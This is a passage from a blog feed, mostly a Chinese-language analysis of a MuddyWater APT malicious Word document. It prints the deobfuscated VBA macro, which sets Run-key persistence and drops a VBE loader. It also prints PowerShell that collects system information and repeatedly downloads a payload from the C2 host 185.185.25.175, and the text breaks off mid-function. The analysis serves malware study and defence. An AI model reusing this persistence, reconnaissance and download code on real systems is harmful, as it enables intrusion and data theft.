class="line">Esc &amp; 4::send, ^&#123;f4&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://yanzhantao.com/windows-scancode-map.html" target="_blank" rel="noopener">https://yanzhantao.com/windows-scancode-map.html</a></p><p><a href="https://github.com/randyrants/sharpkeys" target="_blank" rel="noopener">https://github.com/randyrants/sharpkeys</a></p><p><a href="https://www.autohotkey.com/" target="_blank" rel="noopener">https://www.autohotkey.com/</a></p><p><a href="https://wyagd001.github.io/zh-cn/docs/AutoHotkey.htm" target="_blank" rel="noopener">https://wyagd001.github.io/zh-cn/docs/AutoHotkey.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://xwdidi.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://xwdidi.top/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>MuddyWater(污水) APT样本分析</title>
    <link href="http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(%E6%B1%A1%E6%B0%B4)%20APT%E5%88%86%E6%9E%90/"/>
    <id>http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(污水) APT分析/</id>
    <published>2019-10-05T16:00:00.000Z</published>
    <updated>2019-10-08T17:35:11.492Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文分析作为学习参考的笔记记录.记录整体细节和不曾知道的地方.</p><p>参考与学习的地址为:<a href="https://bbs.pediy.com/thread-252477.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252477.htm</a></p><p>脚本类恶意程序分析技巧汇总:<a href="https://bbs.pediy.com/thread-251102.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251102.htm</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/8659004.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/8659004.html</a></p><p>谢谢师傅的分析文章.</p><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>微步在线搜寻md5=6cb076f1f42573c5c43083a89bcfe442,下载样本文件并且改名.虚拟机使用<code>Office Tool Plus</code>安装office.</p><p>使用hashcalc:    </p><table><thead><tr><th style="text-align:left">SHA1</th><th>4e68e2040acade6369d938f96c95ada050a8e061</th></tr></thead><tbody><tr><td style="text-align:left">SHA-256</td><td>36ccae4dffc70249c79cd3156de1cd238af8f7a3e47dc90a1c33476cf97a77b0</td></tr></tbody></table><h3 id="恶意宏代码"><a href="#恶意宏代码" class="headerlink" title="恶意宏代码"></a>恶意宏代码</h3><p><code>OfficeMalScanner.exe  &quot;Zakupki_Agency on Public Procurement.doc&quot;  info</code>提取宏汇编,<code>atl+F11</code>打开VBA编辑器然后启动内容也可以.</p><p>五个文件分别是:<img src="https://i.loli.net/2019/09/30/TFZtEuR9N4Jc5pj.png" alt></p><h4 id="1-ThisDocument"><a href="#1-ThisDocument" class="headerlink" title="1.ThisDocument"></a>1.ThisDocument</h4><p><img src="https://i.loli.net/2019/09/30/hwzPVutOI8raYJH.png" alt="image.png"></p><p>动态调试F8,会跳出UTF-8窗口.跳转到frmLoadr.Show函数内部.</p><h4 id="2-frmLoadr"><a href="#2-frmLoadr" class="headerlink" title="2.frmLoadr"></a>2.frmLoadr</h4><p><img src="https://i.loli.net/2019/09/30/ovtTYUskGDfQr9j.png" alt="image.png"></p><p>按钮调用buttonQWERTY_Click()函数.给RgSH传入参数7.然后动态调试跳转到<code>RgSH(id)函数</code></p><h4 id="3-RgSH-id"><a href="#3-RgSH-id" class="headerlink" title="3. RgSH(id)"></a>3. RgSH(id)</h4><p><img src="https://i.loli.net/2019/10/01/LsIdhwHNiKDA58J.png" alt="image.png"></p><p>根据mlw()函数解密,写一个小脚本就行,再使用MsgBox()打印,这里有个细节oor的时候进行了字符逆序,所以脚本最好添加.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">char = <span class="string">"""sP = mlw(1353) &amp; mlw(1346) &amp; mlw(1349) &amp; mlw(1315) &amp; mlw(1338) &amp; mlw(1336) &amp; mlw(1317) &amp; mlw(1335) &amp; mlw(1351)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1318) &amp; mlw(1293) &amp; mlw(1351) &amp; mlw(1343) &amp; mlw(1352) &amp; mlw(1332) &amp; mlw(1337) &amp; mlw(1336) &amp; mlw(1335)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1327) &amp; mlw(1351) &amp; mlw(1346) &amp; mlw(1346) &amp; mlw(1349) &amp; mlw(1327) &amp; mlw(1281) &amp; mlw(1327) &amp; mlw(1327)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1268) &amp; mlw(1360) &amp; mlw(1336) &amp; mlw(1351) &amp; mlw(1332) &amp; mlw(1345) &amp; mlw(1346) &amp; mlw(1350) &amp; mlw(1349)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1336) &amp; mlw(1347) &amp; mlw(1344) &amp; mlw(1340) &amp; mlw(1267) &amp; mlw(1296) &amp; mlw(1267) &amp; mlw(1343) &amp; mlw(1336)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1353) &amp; mlw(1336) &amp; mlw(1311) &amp; mlw(1345) &amp; mlw(1346) &amp; mlw(1340) &amp; mlw(1351) &amp; mlw(1332) &amp; mlw(1345)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1346) &amp; mlw(1350) &amp; mlw(1349) &amp; mlw(1336) &amp; mlw(1347) &amp; mlw(1344) &amp; mlw(1340) &amp; mlw(1358) &amp; mlw(1293)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1350) &amp; mlw(1351) &amp; mlw(1344) &amp; mlw(1338) &amp; mlw(1344) &amp; mlw(1345) &amp; mlw(1340) &amp; mlw(1354) """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#去除多余字符</span></span><br><span class="line">char = char.replace(<span class="string">"sP"</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"="</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"mlw("</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">")"</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">num = char.split(<span class="string">"&amp;"</span>)</span><br><span class="line"><span class="comment">#字符转数字</span></span><br><span class="line">num = list(map(int,num))</span><br><span class="line">chr = []</span><br><span class="line"><span class="comment">#逆序打印 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(num)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">num[i] = num[i] <span class="number">-1235</span></span><br><span class="line">print(<span class="string">"chr("</span>+ str(num[i]) +<span class="string">")"</span>,end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">print(<span class="string">"&amp;"</span>,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png" alt="image.png"></p><p>最后所有除掉混淆是这样子的.</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> RgSH(id)</span><br><span class="line">b = PuSH(id)</span><br><span class="line">CallByName <span class="string">"winmgmts:&#123;impersonationLevel = impersonate&#125;!\\.\root\default:StdRegProv"</span>, </span><br><span class="line"><span class="string">"SetStringValue"</span>, </span><br><span class="line">VbMethod, </span><br><span class="line">&amp;H80000001, </span><br><span class="line"><span class="string">"Software\Microsoft\Windows\CurrentVersion\Run"</span>, </span><br><span class="line"><span class="string">"VingValue"</span>, </span><br><span class="line"> b</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>然后动态调试后b的值为%Temp%\aulmgr.vbe,其中<code>PuSH(id)</code>函数下面会继续分析</p><p><a href="https://msdn.microsoft.com/ja-jp/windows/aa393600(v=vs.80" target="_blank" rel="noopener">以这个为参考</a>)得出这个函数大概作用是获取本地注册表对象,调用<code>SetStringValue</code>,在注册表项为<code>Software\Microsoft\Windows\CurrentVersion\Run</code>,创建键名为”VingValue”,并设定值为b.</p><h4 id="PuSH-id"><a href="#PuSH-id" class="headerlink" title="PuSH(id)"></a>PuSH(id)</h4><p><img src="![image.png](https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png" alt>)</p><p>传入参数7;</p><p>执行函数<code>p = d3r(4) &amp; FuN(1)</code>.先运行跳过得到<code>p = %TEMP%\aulmgr.vbe</code></p><p>然后进行<code>If id Mod 5 = 1</code>如果id模5得1则进行下面的操作:利用<code>CreateTextFile</code>创建<code>%Temp%\aulmgr.vbe,</code>对象并写入标题拼接1-13拼接出来的ddd字符串.</p><h4 id="d3r-id1"><a href="#d3r-id1" class="headerlink" title="d3r(id1)"></a>d3r(id1)</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> d3r(id)</span><br><span class="line"><span class="keyword">Set</span> f = <span class="built_in">CreateObject</span>(<span class="string">"scriPtInG.filesystemObJEct"</span>)</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Case</span> (id Mod <span class="number">5</span>)</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">d3r = Environ$(<span class="string">"puBLiC"</span>)获取<span class="string">"public"</span>环境便量路径</span><br><span class="line"><span class="keyword">Case</span> <span class="number">1</span></span><br><span class="line">d3r = Environ$(<span class="string">"aPpDaTa"</span>)  获取<span class="string">"aPpDaTa"</span>环境便量路径</span><br><span class="line"><span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">d3r = f.getspecialfolder(<span class="number">0</span>) 获取%SystemRoot%</span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">d3r = f.getspecialfolder(<span class="number">1</span>)获取<span class="string">"%SystemRoot%\System32环境便量路径</span></span><br><span class="line"><span class="string">Case 4</span></span><br><span class="line"><span class="string">d3r = f.getspecialfolder(2)获取%Temp%环境便量路径</span></span><br><span class="line"><span class="string">Case Else</span></span><br><span class="line"><span class="string">d3r = ""</span></span><br><span class="line"><span class="string">End Select</span></span><br><span class="line"><span class="string">End Function</span></span><br></pre></td></tr></table></figure><p>去除混淆</p><p><code>FiSA()</code>每次都返回”scriPtInG.filesystemObJEct”.流式文本对象.</p><p><code>getspecialfolder(id)</code>是vbs自带的函数,根据参数的不同获得的值也不一样,0=WindowsFolder,1=SystemFolder,2=TemporaryFolder.</p><h4 id="FuN-id"><a href="#FuN-id" class="headerlink" title="FuN(id)"></a>FuN(id)</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> FuN(id)</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Case</span> (id Mod <span class="number">5</span>)</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">FuN = <span class="string">"\aaaaa.tmp"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">1</span></span><br><span class="line">FuN = <span class="string">"\aulngr.vbe"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">FuN = <span class="string">"\bbbbbb.tmp"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">FuN = <span class="string">"\report.xls"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">4</span></span><br><span class="line">FuN = <span class="string">"\report.docx"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">FuN = <span class="string">""</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>宏代码 功能总结</p><p>释放<strong>VBE Loader**</strong>于%temp%\aulmgr.vbe下,并且注册表修改为开机自启动.</p><h3 id="aulngr-vbe-分析"><a href="#aulngr-vbe-分析" class="headerlink" title="aulngr.vbe 分析"></a>aulngr.vbe 分析</h3><p><img src="https://i.loli.net/2019/10/01/YfGXswl4WAt3PJx.png" alt="image.png"></p><table><thead><tr><th>md5</th><th>9d2da5228e21594ab46b4f5281d38b8f</th></tr></thead><tbody><tr><td>sha1</td><td>2b548816eeacd4fd4dee30f46acaecb34b1238e3</td></tr></tbody></table><p>文本看不太懂,根据师傅的报告进行恢复.解除编码后大概这个样子</p><p><img src="https://i.loli.net/2019/10/01/lmN4Lg3Vtb67aj8.png" alt="image.png"></p><p>中间混淆了一大堆看不太懂的的东西,只能看师傅的学习分析.</p><p>去除掉大多数的杂鱼信息,关键字集中在shell</p><p><img src="https://i.loli.net/2019/10/01/fPIcY76Jm9MKVgB.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/01/qgUpVZ29GdFXS4T.png" alt="image.png"></p><p>取b的值存储到<code>%public%\UserImage.png</code>中,再使用powershell运行它.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/w: -w is short <span class="keyword">for</span> -WindowStyle</span><br><span class="line">Normal (<span class="number">0</span>)</span><br><span class="line">Maximized (<span class="number">3</span>)</span><br><span class="line">Minimized (<span class="number">2</span>)</span><br><span class="line">Hidden (<span class="number">1</span>)</span><br><span class="line">gc: <span class="built_in">Get-Content</span> 获取内容</span><br><span class="line">iex: <span class="built_in">Invoke-Expression</span>  调用表达式</span><br></pre></td></tr></table></figure><p><a href="https://stackoverflow.com/questions/55775202/what-is-w-1-and-c-in-powershell-command" target="_blank" rel="noopener">参考</a></p><p>然后分析下b的字符串.将base64编码后的字符串存入vv,然后赋予到er变量.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$er</span> = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(<span class="variable">$vv</span>));&amp; (gcm i*v*p*s*n) <span class="variable">$er</span></span><br></pre></td></tr></table></figure><p>然后运行后面的表达式.那<code>gcm i*v*p*s*n</code>是什么呢,powershell跑一下就行了,唯一匹配iex,也就是调用它.<code>$er</code>的意思就是base64解码后按照unicode解析字符串.</p><p>运行一下得到powershell代码的UserImage.png.</p><h3 id="UserImage-png"><a href="#UserImage-png" class="headerlink" title="UserImage.png"></a>UserImage.png</h3><p>C:\Users\Public\UserImage.png(%public%\UserImage.png)</p><table><thead><tr><th>md5</th><th>34a072f42905f9de31523616e8f207b1</th></tr></thead><tbody><tr><td>SHA1</td><td>3d37affb081e7c9586bdac2fe9e45368f812ceb4</td></tr></tbody></table><p>解码其中的base64编码后的powershell代码.使用<a href="http://prettyprinter.de/" target="_blank" rel="noopener">http://prettyprinter.de</a>略微格式化一下.然后ise中调试.</p><h4 id="powershell函数分析"><a href="#powershell函数分析" class="headerlink" title="powershell函数分析"></a>powershell函数分析</h4><h5 id="lTXxzy53"><a href="#lTXxzy53" class="headerlink" title="lTXxzy53()"></a>lTXxzy53()</h5><p><img src="https://i.loli.net/2019/10/01/cFQ8ZgYNJMmoaud.png" alt="image.png">所有函数都如上面一样加密过,动态调试运行<code>i98mG9I84cHnev2ywJGZ</code>解密就行.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> lTXxzy53()</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;<span class="variable">$whj95r69Xal</span> = <span class="variable">$ENV:USERNAME</span>;&#125;</span><br><span class="line">       <span class="keyword">catch</span>&#123;<span class="variable">$whj95R69xAl</span> = (<span class="string">'Error Username'</span>);&#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$whJ95r69xAl</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>获得环境变量下的用户名称.</p><h5 id="NIQCw20"><a href="#NIQCw20" class="headerlink" title="NIQCw20"></a>NIQCw20</h5><p>不太懂</p><h5 id="EdA4VNZrBAU37Pd7ND"><a href="#EdA4VNZrBAU37Pd7ND" class="headerlink" title="EdA4VNZrBAU37Pd7ND()"></a>EdA4VNZrBAU37Pd7ND()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> EdA4VNZrBAU37Pd7ND()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$BtvwpfSFUmi_</span> = <span class="variable">$Env:eDA4VNZrBAU37pD7Nd</span>;&#125;</span><br><span class="line"><span class="keyword">catch</span>&#123;<span class="variable">$btvwpfSfumI_</span> = (<span class="string">'Error UserDomain'</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$BTvwpfSFumI_</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据下面的提示应该是用户域的名称 <code>%userdomain%</code></p><h5 id="UTFhxPjChlXs1OxREdR"><a href="#UTFhxPjChlXs1OxREdR" class="headerlink" title="UTFhxPjChlXs1OxREdR()"></a>UTFhxPjChlXs1OxREdR()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> UTFhxPjChlXs1OxREdR()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$a3rm5By20VTEfgF04</span> = ls <span class="variable">$enV:USERPROFILE</span>\Desktop;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$A3rm5BY20vteFgF04</span> =<span class="string">"Error ls"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$A3rm5bY20vtEFGF04</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ls遍历桌面文件,错误反汇Errot ls.</p><h5 id="zokOsMYYZQG1GyNMGDZ"><a href="#zokOsMYYZQG1GyNMGDZ" class="headerlink" title="zokOsMYYZQG1GyNMGDZ()"></a>zokOsMYYZQG1GyNMGDZ()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> zokOsMYYZQG1GyNMGDZ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$zhXA59XV3lDJhu</span> = ps;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$ZHXA59xV3LDjHU</span> = <span class="string">"Error TaskList"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$zHxA59xv3lDjHu</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行指令<code>ps</code>,获得进程列表,错误返回”Error TaskList”.</p><h5 id="sp169N5"><a href="#sp169N5" class="headerlink" title="sp169N5()"></a>sp169N5()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> sp169N5()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$iYwj2qTWWlSlvnB</span> = <span class="built_in">New-Object</span> System.Net.WebClient;</span><br><span class="line">        <span class="variable">$iYwj2QTWwlSLVNb</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">        <span class="variable">$iYWj2QtWwLSLvnB</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">        <span class="variable">$LaYS5yC59zA8PFhrFm9TP</span>=<span class="variable">$Iywj2qtwwlsLVNB</span>.DownloadString(<span class="string">"http://ip-api.com/json"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$LAYS5yC59zA8PFhRfM9Tp</span> = <span class="string">"Error Remote IP"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$LAYs5yC59za8PFhrFM9TP</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<a href="http://ip-api.com/json下载回显字符,以json格式保存.错误返回`Error" target="_blank" rel="noopener">http://ip-api.com/json下载回显字符,以json格式保存.错误返回`Error</a> Remote IP`返回如下:<img src="https://i.loli.net/2019/10/01/ovf9WC7StRUhTix.png" alt="image.png"></p><h5 id="dYUUIGUfLNIoN"><a href="#dYUUIGUfLNIoN" class="headerlink" title="dYUUIGUfLNIoN()"></a>dYUUIGUfLNIoN()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> dYUUIGUfLNIoN()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$htVH9OtOCbnP7Oa</span> = (<span class="built_in">Get-WMIObject</span> win32_operatingsystem).name;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$HtvH9OtocBNp7OA</span> = <span class="string">"error os Arch"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$htVH9otOCbnp7OA</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统信息,错误返回”error os Arch”</p><p><img src="https://i.loli.net/2019/10/01/kJ7VhFmIZYNH1ln.png" alt="image.png"></p><h5 id="L82O-u0EwZy（）"><a href="#L82O-u0EwZy（）" class="headerlink" title="L82O_u0EwZy（）"></a>L82O_u0EwZy（）</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> L82O_u0EwZy()</span><br><span class="line">    &#123;</span><br><span class="line">        lTXXzy53;</span><br><span class="line">        Eda4vnZRBaU37pd7ND;</span><br><span class="line">        zoKoSMyYZqg1gYNmGDZ;</span><br><span class="line">        uTFHxpJCHlXs1OXrEdR;</span><br><span class="line">        SP169n5;</span><br><span class="line">        DyuUigUFlnioN;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>运行上述函数.</p><h5 id="finally部分函数"><a href="#finally部分函数" class="headerlink" title="finally部分函数"></a>finally部分函数</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L82o_u0eWZY | <span class="built_in">out-file</span> <span class="variable">$ENV:temp</span>\log.txt;</span><br><span class="line"><span class="variable">$iYwj2qTwWLslvNB</span> = <span class="built_in">New-Object</span> System.Net.WebClient;</span><br><span class="line"><span class="variable">$IYWj2QtwWLSLVNB</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line"><span class="variable">$iYwj2QTWWLSlVNB</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line"><span class="variable">$m2g9a1mNOtasOaLofMKD</span> = <span class="variable">$EnV:temp</span> +<span class="string">'\log.txt'</span>;</span><br><span class="line"><span class="variable">$QBrjTZAqQWJDJ</span> = <span class="string">"http://185.185.25.175/sDownloads/"</span>;</span><br></pre></td></tr></table></figure><p>运行<code>L82o_u0eWZY</code>,将系统心思保存到<code>%temp%\log.txt</code>中,调试得出<code>$m2g9a1mNOtasOaLofMKD</code>是<code>%temp%\log.txt</code></p><h5 id="K9Dpje9u4bcbqu351w"><a href="#K9Dpje9u4bcbqu351w" class="headerlink" title="K9Dpje9u4bcbqu351w()"></a>K9Dpje9u4bcbqu351w()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> K9Dpje9u4bcbqu351w()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>((-<span class="number">1</span> + <span class="number">2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        niqCW20((<span class="number">1</span> + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">start-sleep</span> -s ([int](([int](<span class="number">54</span> / <span class="number">3</span>)) / <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;               <span class="variable">$IyWj2QTWwLSLVnb</span>.DownloadFile(<span class="string">"http://185.185.25.175/sDownloads/"</span>+ <span class="variable">$RLZNAuZxC9UqzY</span> + <span class="string">'.jpeg'</span>,<span class="variable">$ENV:public</span> +<span class="string">"\"</span>+ <span class="string">"ieee"</span> + <span class="string">".dat"</span>);</span><br><span class="line">            CHr0OkIxe0xiupYa;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_</span>.Exception.Message)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$RLZNAuZxC9UqzY</code>这个值等于GUID,<img src="https://i.loli.net/2019/10/02/RDgfKCjoh7FGUqB.png" alt="image.png"></p><p><code>while(1)</code>死循环直到从”<a href="http://185.185.25.175/sDownloads/&quot;+" target="_blank" rel="noopener">http://185.185.25.175/sDownloads/&quot;+</a> guid+ ‘.jpeg’,然后保存为 <code>%Public%ieee.dat</code></p><p>bl4ReiVGQkuTog($nt8brxx)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Lbl4ReiVGQkuTog(<span class="variable">$nt8brxx</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;     <span class="variable">$LaYS5yC59za8PFHRfm9Tp</span>=<span class="variable">$iywj2qtWwLSLvNB</span>.DownloadString(<span class="variable">$Nt8BrxX</span>);&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span 